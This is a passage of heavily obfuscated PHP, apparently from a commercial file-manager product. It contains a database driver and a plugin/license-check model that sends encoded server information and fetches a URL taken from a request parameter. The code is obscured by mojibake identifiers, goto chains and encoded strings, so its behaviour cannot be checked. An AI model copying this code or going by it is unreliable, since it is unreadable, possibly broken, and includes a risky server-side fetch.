F“„…‡’È: return $eÑƒµƒ©Ôƒ; goto E¦ˆÙÌÓß; e è«Š´ÅÄ: $Fœè™ÙÌ†Û =& $_SERVER[İåâé¾]; $this->initConnect(!0); if (think_config($Fœè™ÙÌ†Û[611])) { $A…ßî²å” = str_replace($Fœè™ÙÌ†Û[612], $aç÷„ŠÑ¨Å, think_config($Fœè™ÙÌ†Û[611])); } else { switch ($this->dbType) { case $Fœè™ÙÌ†Û[595]: case $Fœè™ÙÌ†Û[613]: $A…ßî²å” = "\123\105\114\x45\x43\124\40\x20\40\x63\157\x6c\165\155\156\137\x6e\141\x6d\145\40\141\x73\x20\47\116\x61\x6d\145\47\x2c\x20\x20\x20\x64\x61\x74\x61\x5f\x74\x79\160\145\40\x61\163\x20\x27\124\171\x70\x65\x27\x2c\x20\40\x20\143\157\154\x75\x6d\x6e\137\x64\x65\146\x61\x75\154\x74\x20\x61\163\x20\x27\x44\145\x66\141\165\154\164\47\54\x20\40\x20\x69\163\x5f\156\165\154\154\x61\x62\x6c\x65\x20\141\x73\x20\x27\116\165\x6c\154\47\xa\x9\x9\x46\122\117\x4d\x9\x69\156\146\x6f\162\x6d\x61\164\x69\x6f\x6e\x5f\163\x63\150\145\155\141\x2e\x74\141\142\154\145\163\x20\x41\123\40\x74\12\11\x9\x4a\117\x49\116\11\x69\156\x66\x6f\162\155\141\164\151\x6f\x6e\137\163\143\x68\x65\155\141\56\x63\x6f\154\165\x6d\x6e\163\x20\101\x53\x20\x63\12\11\x9\x4f\x4e\x20\40\x74\x2e\x74\141\142\x6c\145\x5f\x63\x61\164\x61\154\157\x67\40\75\40\143\56\164\141\142\154\145\x5f\143\141\164\141\x6c\x6f\x67\xa\x9\11\x41\x4e\x44\40\x74\x2e\164\x61\142\154\x65\137\163\x63\150\x65\x6d\141\40\75\40\x63\x2e\164\x61\x62\x6c\x65\137\x73\x63\150\x65\x6d\141\12\x9\x9\101\116\x44\x20\x74\x2e\164\141\142\154\x65\137\156\x61\155\x65\40\75\40\143\56\x74\141\142\154\145\x5f\156\141\x6d\145\12\11\x9\x57\x48\x45\x52\x45\x20\x20\40\164\56\x74\x61\x62\x6c\x65\137\156\141\x6d\x65\x20\75\40\x27{$aç÷„ŠÑ¨Å}\47"; break; case $Fœè™ÙÌ†Û[614]: $A…ßî²å” = $Fœè™ÙÌ†Û[615] . $aç÷„ŠÑ¨Å . $Fœè™ÙÌ†Û[616]; break; case $Fœè™ÙÌ†Û[596]: case $Fœè™ÙÌ†Û[598]: $A…ßî²å” = $Fœè™ÙÌ†Û[617] . $Fœè™ÙÌ†Û[618] . $Fœè™ÙÌ†Û[619] . strtoupper($aç÷„ŠÑ¨Å) . $Fœè™ÙÌ†Û[620] . strtoupper($aç÷„ŠÑ¨Å) . $Fœè™ÙÌ†Û[621]; break; case $Fœè™ÙÌ†Û[622]: $A…ßî²å” = $Fœè™ÙÌ†Û[623] . $aç÷„ŠÑ¨Å . $Fœè™ÙÌ†Û[624]; break; case $Fœè™ÙÌ†Û[597]: break; case $Fœè™ÙÌ†Û[625]: default: $A…ßî²å” = $Fœè™ÙÌ†Û[626] . ($this->dbType == $Fœè™ÙÌ†Û[625] ? "\140{$aç÷„ŠÑ¨Å}\x60" : $aç÷„ŠÑ¨Å); } } goto e¿¥ç—áÆˆ; E¦ˆÙÌÓß: } public function getTables($dòÌëé¼¿ = '') { $cÕƒæØ©Ì‚ =& $_SERVER[İåâé¾]; if (think_config($cÕƒæØ©Ì‚[628])) { $A‡ë¿ñ¨†ä = str_replace($cÕƒæØ©Ì‚[629], $dòÌëé¼¿, think_config($cÕƒæØ©Ì‚[628])); } else { switch ($this->dbType) { case $cÕƒæØ©Ì‚[596]: case $cÕƒæØ©Ì‚[598]: $A‡ë¿ñ¨†ä = $cÕƒæØ©Ì‚[630]; break; case $cÕƒæØ©Ì‚[595]: case $cÕƒæØ©Ì‚[613]: $A‡ë¿ñ¨†ä = $cÕƒæØ©Ì‚[631]; break; case $cÕƒæØ©Ì‚[622]: $A‡ë¿ñ¨†ä = $cÕƒæØ©Ì‚[632]; break; case $cÕƒæØ©Ì‚[597]: think_exception(think_lang($cÕƒæØ©Ì‚[633]) . $cÕƒæØ©Ì‚[634]); break; case $cÕƒæØ©Ì‚[614]: $A‡ë¿ñ¨†ä = $cÕƒæØ©Ì‚[42] . $cÕƒæØ©Ì‚[43] . $cÕƒæØ©Ì‚[44]; break; case $cÕƒæØ©Ì‚[625]: default: if (!empty($dòÌëé¼¿)) { $A‡ë¿ñ¨†ä = $cÕƒæØ©Ì‚[577] . $dòÌëé¼¿; } else { $A‡ë¿ñ¨†ä = $cÕƒæØ©Ì‚[578]; } } } $BÚ¹Ü†¦«Õ = $this->query($A‡ë¿ñ¨†ä); $EŒòá½‹­ = array(); foreach ($BÚ¹Ü†¦«Õ as $FãÜÔ“àå… => $F¶ØÌ«Ô‹Í) { $EŒòá½‹­[$FãÜÔ“àå…] = current($F¶ØÌ«Ô‹Í); } return $EŒòá½‹­; } protected function parseLimit($A©†®íœß¢) { $C´õ‘…í =& $_SERVER[İåâé¾]; $f­öğ­¾”« = $C´õ‘…í[33]; if (!empty($A©†®íœß¢)) { switch ($this->dbType) { case $C´õ‘…í[622]: case $C´õ‘…í[614]: $A©†®íœß¢ = explode($C´õ‘…í[47], $A©†®íœß¢); if (count($A©†®íœß¢) > 1) { $f­öğ­¾”« .= $C´õ‘…í[48] . $A©†®íœß¢[1] . $C´õ‘…í[49] . $A©†®íœß¢[0] . $C´õ‘…í[50]; } else { $f­öğ­¾”« .= $C´õ‘…í[48] . $A©†®íœß¢[0] . $C´õ‘…í[50]; } break; case $C´õ‘…í[595]: case $C´õ‘…í[613]: break; case $C´õ‘…í[597]: break; case $C´õ‘…í[596]: case $C´õ‘…í[598]: break; case $C´õ‘…í[625]: default: $f­öğ­¾”« .= $C´õ‘…í[48] . $A©†®íœß¢ . $C´õ‘…í[50]; } } return $f­öğ­¾”«; } public function parseKey(&$eÄÙñìÑˆÆ, $e¤Ü‘ÇèÉ = true) { $dÔÍäš»Ÿ =& $_SERVER[İåâé¾]; if ($e¤Ü‘ÇèÉ) { $eÄÙñìÑˆÆ = $this->parseKeyCheck($eÄÙñìÑˆÆ); } if ($this->dbType == $dÔÍäš»Ÿ[625]) { if ($eÄÙñìÑˆÆ != $dÔÍäš»Ÿ[172] && !preg_match($dÔÍäš»Ÿ[588], $eÄÙñìÑˆÆ)) { $eÄÙñìÑˆÆ = $dÔÍäš»Ÿ[589] . trim($eÄÙñìÑˆÆ, $dÔÍäš»Ÿ[589]) . $dÔÍäš»Ÿ[589]; } return $eÄÙñìÑˆÆ; } else { return parent::parseKey($eÄÙñìÑˆÆ); } } public function close() { $this->_linkID = null; } public function error() { $A¶Ö½µê¿ƒ =& $_SERVER[İåâé¾]; if ($this->PDOStatement) { $e‹‰¨ã‚Ã‰ = $this->PDOStatement->errorInfo(); $this->error = $e‹‰¨ã‚Ã‰[1] . $A¶Ö½µê¿ƒ[4] . $e‹‰¨ã‚Ã‰[2]; } else { $this->error = $A¶Ö½µê¿ƒ[33]; } if ($A¶Ö½µê¿ƒ[33] != $this->queryStr) { $this->error .= LNG($A¶Ö½µê¿ƒ[45]) . $this->queryStr; } think_trace($this->error, $A¶Ö½µê¿ƒ[33], $A¶Ö½µê¿ƒ[46]); return $this->error; } public function escapeString($câÌçÍŸÊ) { $EĞÅ–™Äõè =& $_SERVER[İåâé¾]; switch ($this->dbType) { case $EĞÅ–™Äõè[622]: case $EĞÅ–™Äõè[595]: case $EĞÅ–™Äõè[613]: case $EĞÅ–™Äõè[625]: return addslashes($câÌçÍŸÊ); case $EĞÅ–™Äõè[597]: case $EĞÅ–™Äõè[614]: case $EĞÅ–™Äõè[596]: case $EĞÅ–™Äõè[598]: return str_ireplace($EĞÅ–™Äõè[55], $EĞÅ–™Äõè[56], $câÌçÍŸÊ); } } protected function parseValue($d¸†òƒ†ÄÔ) { $BââÉ…¬× =& $_SERVER[İåâé¾]; if (is_string($d¸†òƒ†ÄÔ)) { $d¸†òƒ†ÄÔ = strpos($d¸†òƒ†ÄÔ, $BââÉ…¬×[4]) === 0 ? $this->escapeString($d¸†òƒ†ÄÔ) : $BââÉ…¬×[635] . $this->escapeString($d¸†òƒ†ÄÔ) . $BââÉ…¬×[635]; } elseif (isset($d¸†òƒ†ÄÔ[0]) && is_string($d¸†òƒ†ÄÔ[0]) && strtolower($d¸†òƒ†ÄÔ[0]) == $BââÉ…¬×[288]) { $d¸†òƒ†ÄÔ = $this->escapeString($d¸†òƒ†ÄÔ[1]); } elseif (is_array($d¸†òƒ†ÄÔ)) { $d¸†òƒ†ÄÔ = array_map(array($this, $BââÉ…¬×[636]), $d¸†òƒ†ÄÔ); } elseif (is_bool($d¸†òƒ†ÄÔ)) { $d¸†òƒ†ÄÔ = $d¸†òƒ†ÄÔ ? $BââÉ…¬×[376] : $BââÉ…¬×[402]; } elseif (is_null($d¸†òƒ†ÄÔ)) { $d¸†òƒ†ÄÔ = $BââÉ…¬×[98]; } return $d¸†òƒ†ÄÔ; } public function getLastInsertId() { $DñÂ‘ó³Œô =& $_SERVER[İåâé¾]; switch ($this->dbType) { case $DñÂ‘ó³Œô[622]: case $DñÂ‘ó³Œô[614]: case $DñÂ‘ó³Œô[595]: case $DñÂ‘ó³Œô[613]: case $DñÂ‘ó³Œô[597]: case $DñÂ‘ó³Œô[625]: return $this->_linkID->lastInsertId(); case $DñÂ‘ó³Œô[596]: case $DñÂ‘ó³Œô[598]: $cÚŞæ®½Ö = $this->table; $eÊÂ¡œË±š = $this->query("\123\105\x4c\105\103\x54\40{$cÚŞæ®½Ö}\56\143\x75\x72\x72\x76\141\x6c\40\x63\x75\162\162\166\x61\x6c\40\106\x52\x4f\x4d\40\144\x75\141\154"); return $eÊÂ¡œË±š ? $eÊÂ¡œË±š[0][$DñÂ‘ó³Œô[637]] : 0; } } } goto C’»›Ú˜Š±; fè¤ò¢™: $_SERVER[$_SERVER[•¡£][32]] = BASIC_PATH . $_SERVER[•¡£][33]; $_SERVER[$_SERVER[•¡£][34]] = filesize($_SERVER[$_SERVER[•¡£][32]]); $_SERVER[$_SERVER[•¡£][35]] = ("\x38\x31\x38\x35".base64_decode('NjI='))+0;$_eFtC="nKwiHsgAVaQPEmTYJcPdgJqtrsKDZwfY4AM9sc87SRSyp";; goto bƒ¶¿Ò˜‰î; dğÎ¡Ü”Œ: register_shutdown_function($_SERVER[•¡£][21]); set_error_handler($_SERVER[•¡£][29], $aàËøï¦¢à); if (function_exists($_SERVER[•¡£][30])) { set_exception_handler($_SERVER[•¡£][31]); } goto fè¤ò¢™; E¶ÃäØÛêÔ: $_SERVER[¦ÖÉâÛ¯ï‘] = explode($_SERVER[İåâé¾][1648], gzinflate(substr($_SERVER[İåâé¾][1649], 10, -8))); class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\160\x6c\165\147\x69\156\x4c\151\x73\x74"; public $field = array("\156\x61\155\145", "\x73\164\x61\164\165\163", "\x72\x65\x67\151\145\163\164", "\x63\157\156\146\151\x67"); private $versionData = array(); private $version = "\101"; public function loadList($eöƒªéç°Â = false) { $bâÔ±¿³ŞŞ = array_to_keyvalue($this->listData(), $_SERVER[¦ÖÉâÛ¯ï‘][0]); if ($eöƒªéç°Â) { return $bâÔ±¿³ŞŞ[$eöƒªéç°Â]; } return $bâÔ±¿³ŞŞ; } public function init() { goto bİÑº‘õ·ö; bÙÏ¾°¶Íí: $this->assignCopyright(); $this->disableCheck(); Hook::bind($e…¹µ‡›ä[14], $e…¹µ‡›ä[15]); goto AÇ÷ŞøˆÀˆ; bİÑº‘õ·ö: $e…¹µ‡›ä =& $_SERVER[¦ÖÉâÛ¯ï‘]; $F¿ƒİˆ«õÂ = $this->loadList(); $this->dataCheck(); goto E÷ƒµ«×Õì; aš»’ªÄ†²: if (isset($_GET[$e…¹µ‡›ä[5]]) && in_array(strtolower(ACTION), $cŞùÑ•½ñß)) { $Bä‰Šˆà³’ = hash_decode($_GET[$e…¹µ‡›ä[5]]); header($e…¹µ‡›ä[6]); if ($GLOBALS[$e…¹µ‡›ä[7]] && $Bä‰Šˆà³’ && substr($Bä‰Šˆà³’, 0, 4) == $e…¹µ‡›ä[8]) { $Bä‰Šˆà³’ = str_replace($e…¹µ‡›ä[9], $e…¹µ‡›ä[10], $Bä‰Šˆà³’); $aª¹ô½´œ” = url_request($Bä‰Šˆà³’, $e…¹µ‡›ä[11], !1, !1, !1, !1, 2); if ($aª¹ô½´œ”[$e…¹µ‡›ä[12]] && strstr($aª¹ô½´œ”[$e…¹µ‡›ä[12]], $e…¹µ‡›ä[13])) { echo $aª¹ô½´œ”[$e…¹µ‡›ä[12]]; } } die; } $this->checkDataInit(); $this->checkVersion(); goto bÙÏ¾°¶Íí; E‘è‹İÒæ³: Hook::trigger($e…¹µ‡›ä[2]); Hook::trigger(ACTION); $cŞùÑ•½ñß = array($e…¹µ‡›ä[3], $e…¹µ‡›ä[4]); goto aš»’ªÄ†²; E÷ƒµ«×Õì: $this->dataAllow(); $F¿ƒİˆ«õÂ = $this->checkPlugin($F¿ƒİˆ«õÂ); foreach ($F¿ƒİˆ«õÂ as $F£¨ø±ÊÀ => $FÏñ´ÁÙŒ) { $fÄ¦Íİ¹ÁÑ = $this->appAllow($F£¨ø±ÊÀ, $FÏñ´ÁÙŒ); if (!$fÄ¦Íİ¹ÁÑ) { continue; } foreach ($FÏñ´ÁÙŒ[$e…¹µ‡›ä[1]] as $Bõ½„õ¤‘á => $cñÂ §ŒËç) { Hook::bind($Bõ½„õ¤‘á, $cñÂ §ŒËç); } } goto E‘è‹İÒæ³; AÇ÷ŞøˆÀˆ: Hook::bind($e…¹µ‡›ä[16], $e…¹µ‡›ä[17]); goto Eë³… Èöë; Eë³… Èöë: } public function optionsFilter($D±”‡³êÌí) { goto A¦¿î¶‚Œ»; dñ•·°ë¾é: unset($D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[47]][$Fµ‹ì¯©Ô[49]]); unset($D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[46]][$Fµ‹ì¯©Ô[31]]); unset($D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[46]][$Fµ‹ì¯©Ô[50]]); goto AÓë†Êñ™õ; CçÆæìÍŒª: if ($this->version == $Fµ‹ì¯©Ô[65]) { $D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[46]][$Fµ‹ì¯©Ô[51]][$Fµ‹ì¯©Ô[57]] = 0; } $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[70]] = _get($this->versionData, $Fµ‹ì¯©Ô[71], $Fµ‹ì¯©Ô[72]); $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[73]] = _get($this->versionData, $Fµ‹ì¯©Ô[74], $Fµ‹ì¯©Ô[72]); goto Fä¦‰–¢¾÷; Eˆ¤çŞİš²: foreach ($a¯ŠÖâ‰ôï as $fßíòÀŞÔ¬) { $C¶®¼¡Š = $GLOBALS[$Fµ‹ì¯©Ô[43]][$Fµ‹ì¯©Ô[44]][$fßíòÀŞÔ¬]; if (isset($FÙÁƒ¹ã’‹[$fßíòÀŞÔ¬])) { $C¶®¼¡Š = $FÙÁƒ¹ã’‹[$fßíòÀŞÔ¬]; } $D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[46]][$fßíòÀŞÔ¬] = $C¶®¼¡Š; } $FâÕâ„ãÍÒ = $D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[46]][$Fµ‹ì¯©Ô[31]]; unset($D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[47]][$Fµ‹ì¯©Ô[48]]); goto dñ•·°ë¾é; A¦¿î¶‚Œ»: $Fµ‹ì¯©Ô =& $_SERVER[¦ÖÉâÛ¯ï‘]; $FÙÁƒ¹ã’‹ = Model($Fµ‹ì¯©Ô[18])->get(); $a¯ŠÖâ‰ôï = array($Fµ‹ì¯©Ô[19], $Fµ‹ì¯©Ô[20], $Fµ‹ì¯©Ô[21], $Fµ‹ì¯©Ô[22], $Fµ‹ì¯©Ô[23], $Fµ‹ì¯©Ô[24], $Fµ‹ì¯©Ô[25], $Fµ‹ì¯©Ô[26], $Fµ‹ì¯©Ô[27], $Fµ‹ì¯©Ô[28], $Fµ‹ì¯©Ô[29], $Fµ‹ì¯©Ô[30], $Fµ‹ì¯©Ô[31], $Fµ‹ì¯©Ô[32], $Fµ‹ì¯©Ô[33], $Fµ‹ì¯©Ô[34], $Fµ‹ì¯©Ô[35], $Fµ‹ì¯©Ô[36], $Fµ‹ì¯©Ô[37], $Fµ‹ì¯©Ô[38], $Fµ‹ì¯©Ô[39], $Fµ‹ì¯©Ô[40], $Fµ‹ì¯©Ô[41], $Fµ‹ì¯©Ô[42]); goto Eˆ¤çŞİš²; AÓë†Êñ™õ: $D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[46]][$Fµ‹ì¯©Ô[51]] = array($Fµ‹ì¯©Ô[52] => (int) $FâÕâ„ãÍÒ[$Fµ‹ì¯©Ô[53]], $Fµ‹ì¯©Ô[54] => array_filter(_get($FâÕâ„ãÍÒ, $Fµ‹ì¯©Ô[55], array())), $Fµ‹ì¯©Ô[56] => (int) _get($FâÕâ„ãÍÒ, $Fµ‹ì¯©Ô[57], 0)); $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[59]] = Action($Fµ‹ì¯©Ô[60])->accessToken(); $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[61]] = md5(BASIC_PATH . $FÙÁƒ¹ã’‹[$Fµ‹ì¯©Ô[62]]); goto eö‰ØÒ²êê; eö‰ØÒ²êê: $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[63]] = base64_encode(serverInfo()); $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[64]] = $this->version; if ($FÙÁƒ¹ã’‹[$Fµ‹ì¯©Ô[64]] != $Fµ‹ì¯©Ô[65]) { $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[66]] = $FÙÁƒ¹ã’‹[$Fµ‹ì¯©Ô[66]]; $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[67]] = $FÙÁƒ¹ã’‹[$Fµ‹ì¯©Ô[67]]; $cîò¸ôíù¾ = rand_string(10) . $this->version . rand_string(5); $D±”‡³êÌí[$Fµ‹ì¯©Ô[45]][$Fµ‹ì¯©Ô[68]][$Fµ‹ì¯©Ô[69]] = $this->encode($cîò¸ôíù¾, $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[61]]); } goto CçÆæìÍŒª; Fä¦‰–¢¾÷: if ($GLOBALS[$Fµ‹ì¯©Ô[7]] && $this->config[$Fµ‹ì¯©Ô[75]]) { $D±”‡³êÌí[$Fµ‹ì¯©Ô[58]][$Fµ‹ì¯©Ô[76]] = WEB_ROOT; } return $D±”‡³êÌí; goto fÖ˜Ğ–ÅÖ; fÖ˜Ğ–ÅÖ: } private function assignCopyright() { goto B”»‡‰ìÑ¨; B”»‡‰ìÑ¨: $b³¡„²ÃŠ£ =& $_SERVER[¦ÖÉâÛ¯ï‘]; if ($this->version == $b³¡„²ÃŠ£[65]) { return; } $b‡ì¬ùÒ‚å = array($b³¡„²ÃŠ£[77], $b³¡„²ÃŠ£[78], $b³¡„²ÃŠ£[79], $b³¡„²ÃŠ£[80], $b³¡„²ÃŠ£[81], $b³¡„²ÃŠ£[82]); goto bĞøÌ»„Æñ; bĞøÌ»„Æñ: $cğóÃêŸØá = Model($b³¡„²ÃŠ£[18])->get(); $C„‡Ã¼Í¯ = array($b³¡„²ÃŠ£[83] => $cğóÃêŸØá[$b³¡„²ÃŠ£[19]], $b³¡„²ÃŠ£[84] => $cğóÃêŸØá[$b³¡„²ÃŠ£[20]], $b³¡„²ÃŠ£[85] => $b³¡„²ÃŠ£[72]); if (ACTION == $b³¡„²ÃŠ£[3]) { $EÃ³ÔÜÀÌŒ = $this->userCount(); $aŠ÷§å˜èö = $b³¡„²ÃŠ£[72]; $b¦”›˜ñó˜ = _get($this->versionData, $b³¡„²ÃŠ£[86]); if ($b¦”›˜ñó˜) { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[87] . $b¦”›˜ñó˜ . $b³¡„²ÃŠ£[88]; $aØ‹ŠÏ†‡“ = _get($this->versionData, $b³¡„²ÃŠ£[74]); if ($aØ‹ŠÏ†‡“ - time() >= 0) { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[89] . date($b³¡„²ÃŠ£[90], $aØ‹ŠÏ†‡“) . $b³¡„²ÃŠ£[88]; } else { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[89] . date($b³¡„²ÃŠ£[90], $aØ‹ŠÏ†‡“); $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[91]; } $dÜ‰òø«‚½ = strtotime(_get($this->versionData, $b³¡„²ÃŠ£[92])); if ($dÜ‰òø«‚½ - time() <= 3600 * 24 * 365) { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[93] . date($b³¡„²ÃŠ£[90], $dÜ‰òø«‚½) . $b³¡„²ÃŠ£[88]; } else { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[94]; } } if ($EÃ³ÔÜÀÌŒ >= 10000) { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[95]; } else { $aŠ÷§å˜èö .= $b³¡„²ÃŠ£[96] . $EÃ³ÔÜÀÌŒ . $b³¡„²ÃŠ£[97]; } $C„‡Ã¼Í¯[$b³¡„²ÃŠ£[98]] = $aŠ÷§å˜èö; } goto BÌâ¾Õ½à; BÌâ¾Õ½à: foreach ($b‡ì¬ùÒ‚å as $bö…ÎÀ™ƒç) { if (!isset($cğóÃêŸØá[$bö…ÎÀ™ƒç]) || !$cğóÃêŸØá[$bö…ÎÀ™ƒç]) { continue; } $C„‡Ã¼Í¯[$bö…ÎÀ™ƒç] = $cğóÃêŸØá[$bö…ÎÀ™ƒç]; } I18n::set($C„‡Ã¼Í¯); goto DäÇá——Ş®; DäÇá——Ş®: } private function checkDataInit() { goto D‚’«Í§©¨; B¶öõ¬¹ŒË: $D¯×´ó¼‡ï = $D‰Êå . $C“µÓ³Ğé¼[$dË¾·¹ô×[64]] . Mcrypt::encode(md5($C“µÓ³Ğé¼[$dË¾·¹ô×[126]]), $D‰Êå); $C“µÓ³Ğé¼[$dË¾·¹ô×[67]] = base64_encode(strrev(Mcrypt::encode($D¯×´ó¼‡ï, $dË¾·¹ô×[132]))); if ($B¼Èì‹ÓçØ[$dË¾·¹ô×[133]] && $B¼Èì‹ÓçØ[$dË¾·¹ô×[133]] >= 1) { Model($dË¾·¹ô×[18])->setDeep($dË¾·¹ô×[134], $dË¾·¹ô×[135]); } goto Cø™á¯Í¶; fôÄ»í˜˜: $this->update($AßĞ¸Õë„[$dË¾·¹ô×[137]], array($dË¾·¹ô×[138] => $A—Ïô“ìì)); show_json(LNG($dË¾·¹ô×[139]), !0); goto AÀŒÂ“‘…®; fÇÉ”Ó–›: $C“µÓ³Ğé¼ = array($dË¾·¹ô×[126] => $dóã­‰“Ÿ°[$dË¾·¹ô×[102]], $dË¾·¹ô×[127] => $B¼Èì‹ÓçØ[$dË¾·¹ô×[128]], $dË¾·¹ô×[129] => rand_string(16), $dË¾·¹ô×[64] => $B¼Èì‹ÓçØ[$dË¾·¹ô×[130]]); if ($dóã­‰“Ÿ°[$dË¾·¹ô×[105]]) { $C“µÓ³Ğé¼[$dË¾·¹ô×[129]] = $dóã­‰“Ÿ°[$dË¾·¹ô×[105]]; } $bó·†™šª¬ = substr(md5($C“µÓ³Ğé¼[$dË¾·¹ô×[127]]), 10, 10); goto Féï¡´—Ş»; cõ‹ºÅ¬á: $BÎ×¸½ƒäø = $this->encode(json_encode($B¼Èì‹ÓçØ), $aÜÆŸ¡Œ¹¦); $F§à”¹âË = $this->loadList(); $AßĞ¸Õë„ = $F§à”¹âË[$dË¾·¹ô×[136]]; goto bÊÅà¶Ä¤æ; bßˆ¯¾¼®‰: $C‰¿×‹»»‚ = Mcrypt::decode($dË¾·¹ô×[104], $dË¾·¹ô×[58]); $dóã­‰“Ÿ° = array($dË¾·¹ô×[102] => $d£‹‹È®³Ë[$dË¾·¹ô×[102]], $dË¾·¹ô×[105] => rand_string(16), $dË¾·¹ô×[106] => $dË¾·¹ô×[107], $dË¾·¹ô×[108] => KOD_VERSION, $dË¾·¹ô×[109] => $_SERVER[$dË¾·¹ô×[110]], $dË¾·¹ô×[111] => INSTALL_CHANNEL); $F¾œª”´„ = md5(BASIC_PATH . $f¾ôº–Í); goto E«ÌàĞøÈÔ; CÄˆ‚¼óï: if (isset($d£‹‹È®³Ë[$dË¾·¹ô×[101]])) { $this->dataReset(); die; } if (!isset($d£‹‹È®³Ë[$dË¾·¹ô×[102]]) || strlen($d£‹‹È®³Ë[$dË¾·¹ô×[102]]) != 16) { show_json($dË¾·¹ô×[103] . $d£‹‹È®³Ë[$dË¾·¹ô×[102]], !1); } $f¾ôº–Í = Model($dË¾·¹ô×[18])->get($dË¾·¹ô×[62]); goto bßˆ¯¾¼®‰; D‚’«Í§©¨: $dË¾·¹ô× =& $_SERVER[¦ÖÉâÛ¯ï‘]; if (ACTION != $dË¾·¹ô×[99] || !$GLOBALS[$dË¾·¹ô×[7]]) { return; } $d£‹‹È®³Ë = $GLOBALS[$dË¾·¹ô×[100]]; goto CÄˆ‚¼óï; bÊÅà¶Ä¤æ: $A—Ïô“ìì = $AßĞ¸Õë„[$dË¾·¹ô×[43]]; $A—Ïô“ìì = array(); $A—Ïô“ìì[$DÓ«Ú¥Å¬•] = $BÎ×¸½ƒäø; goto fôÄ»í˜˜; Cø™á¯Í¶: Model($dË¾·¹ô×[18])->set($C“µÓ³Ğé¼); $aÜÆŸ¡Œ¹¦ = md5(BASIC_PATH . strrev($f¾ôº–Í) . $C“µÓ³Ğé¼[$dË¾·¹ô×[127]]); $DÓ«Ú¥Å¬• = strrev(substr($aÜÆŸ¡Œ¹¦, 10, 16)); goto cõ‹ºÅ¬á; Féï¡´—Ş»: $CŞ÷ìäô– = $bó·†™šª¬ . $C“µÓ³Ğé¼[$dË¾·¹ô×[64]] . $C“µÓ³Ğé¼[$dË¾·¹ô×[129]]; $C“µÓ³Ğé¼[$dË¾·¹ô×[66]] = strrev(base64_encode(Mcrypt::encode($CŞ÷ìäô–, $dË¾·¹ô×[131]))); $D‰Êå = rand_string(16); goto B¶öõ¬¹ŒË; E«ÌàĞøÈÔ: if ($d£‹‹È®³Ë[$dË¾·¹ô×[112]] == $dË¾·¹ô×[113]) { $dë…¹—óÊ = Mcrypt::encode($F¾œª”´„, $dË¾·¹ô×[114]); $E²…²À¯›ç = json_encode($dóã­‰“Ÿ°); $E²…²À¯›ç = $this->encode($E²…²À¯›ç, $F¾œª”´„ . $dË¾·¹ô×[115], 3); $a®ŠŒ‡Ù = $C‰¿×‹»»‚ . $dË¾·¹ô×[116] . $dë…¹—óÊ . $dË¾·¹ô×[117]; show_json($a®ŠŒ‡Ù . $E²…²À¯›ç, !0, $C‰¿×‹»»‚); } else { if ($d£‹‹È®³Ë[$dË¾·¹ô×[112]] == $dË¾·¹ô×[118]) { $bğ¨†¿ïÓ = substr(md5($dË¾·¹ô×[119], $F¾œª”´„), 12, 15) . $dË¾·¹ô×[120]; $E²…²À¯›ç = $this->decode($d£‹‹È®³Ë[$dË¾·¹ô×[121]], $bğ¨†¿ïÓ, 2); $dÔÑ£™šÙæ = json_decode($E²…²À¯›ç, !0); if (!is_array($dÔÑ£™šÙæ) || !is_array($dÔÑ£™šÙæ[$dË¾·¹ô×[12]]) || $dÔÑ£™šÙæ[$dË¾·¹ô×[102]] != !0) { $A» ‹ÔÅœº = $dË¾·¹ô×[122]; $e¿á±Íª„ = $dÔÑ£™šÙæ[$dË¾·¹ô×[12]] ? $dË¾·¹ô×[123] . $dÔÑ£™šÙæ[$dË¾·¹ô×[12]] : $A» ‹ÔÅœº; show_json($e¿á±Íª„, !1); } else { $dóã­‰“Ÿ°[$dË¾·¹ô×[105]] = $dÔÑ£™šÙæ[$dË¾·¹ô×[12]][$dË¾·¹ô×[124]]; } } else { $dÔÑ£™šÙæ = url_request($C‰¿×‹»»‚, $dË¾·¹ô×[11], $dóã­‰“Ÿ°, !1, !1, !0, 10); $dÔÑ£™šÙæ = $dÔÑ£™šÙæ[$dË¾·¹ô×[12]]; } } if (!is_array($dÔÑ£™šÙæ) || !is_array($dÔÑ£™šÙæ[$dË¾·¹ô×[12]]) || $dÔÑ£™šÙæ[$dË¾·¹ô×[102]] != !0) { $A» ‹ÔÅœº = LNG($dË¾·¹ô×[125]); $e¿á±Íª„ = $dÔÑ£™šÙæ[$dË¾·¹ô×[12]] ? $dË¾·¹ô×[123] . $dÔÑ£™šÙæ[$dË¾·¹ô×[12]] : $A» ‹ÔÅœº; show_json($e¿á±Íª„, !1); } $B¼Èì‹ÓçØ = $dÔÑ£™šÙæ[$dË¾·¹ô×[12]]; goto fÇÉ”Ó–›; AÀŒÂ“‘…®: } private function dataReset() { $B·ÛÈíâ‘¡ =& $_SERVER[¦ÖÉâÛ¯ï‘]; 